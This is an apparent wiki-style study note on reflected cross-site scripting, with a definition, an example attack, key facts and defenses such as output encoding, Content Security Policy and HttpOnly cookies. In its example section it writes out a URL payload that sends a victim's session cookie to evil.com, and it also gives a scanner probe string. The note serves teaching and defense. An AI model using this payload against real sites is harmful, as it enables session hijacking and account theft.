# reflected cross-site scripting

## What it is
Like slipping a poisoned note into a restaurant's suggestion box that gets immediately read aloud to the next customer — the malicious script is embedded in a URL, sent to the server, and "reflected" back in the response to whoever clicks it. Reflected XSS is a non-persistent injection attack where malicious JavaScript is crafted into a request (typically a URL parameter), the vulnerable server echoes that input directly into the HTML response, and the victim's browser executes it. Unlike stored XSS, the payload is never saved server-side — it lives only in the crafted link.

## Why it matters
An attacker targeting a banking portal's search feature crafts a URL like `https://bank.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>`, then sends it to a victim via phishing email. When the victim clicks it and the server reflects the unescaped input, the script fires in the victim's browser context, instantly exfiltrating their session cookie to the attacker's server — no login required.

## Key facts
- Reflected XSS is classified as **Type 1 XSS** by OWASP; it requires the victim to click a specially crafted link, making social engineering the delivery mechanism
- The attack executes in the **victim's browser**, under the **same-origin policy** of the vulnerable site, granting access to cookies, tokens, and DOM content
- Primary defenses are **input validation**, **output encoding** (e.g., HTML-encoding `<` as `&lt;`), and **Content Security Policy (CSP)** headers
- **HttpOnly cookie flag** prevents JavaScript from reading cookies, limiting the damage even if XSS fires
- Security scanners detect reflected XSS by injecting probe strings (e.g., `"><script>alert(1)</script>`) and checking if they appear unencoded in the response

## Related concepts
[[stored cross-site scripting]] [[DOM-based XSS]] [[Content Security Policy]] [[session hijacking]] [[input validation]]